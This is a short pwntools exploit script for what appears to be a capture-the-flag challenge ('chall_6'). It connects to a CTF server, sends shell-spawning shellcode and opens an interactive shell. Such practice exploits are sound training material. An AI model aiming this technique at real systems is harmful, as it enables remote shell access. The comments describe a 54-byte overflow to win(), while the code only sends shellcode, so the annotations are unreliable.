from pwn import *

EXE = ELF("./challenge/chall_6")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

win_address_offset = EXE.symbols['win']
main_address_offset = EXE.symbols['main']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13375)
	return r

io = conn(False)
# Wait for the process to send "One more time" and respond to move onto vuln()
io.recvline()
io.send(b'a\n')

# Create a payload with an offset of 54 bytes then the address win(), send it, and open an 
# interactive terminal -- The system is 64 bit so we need a 64 bit pointer to the address of win()
payload = asm(shellcraft.sh())
payload += b'\n'
io.send(payload)
io.interactive()

io.close()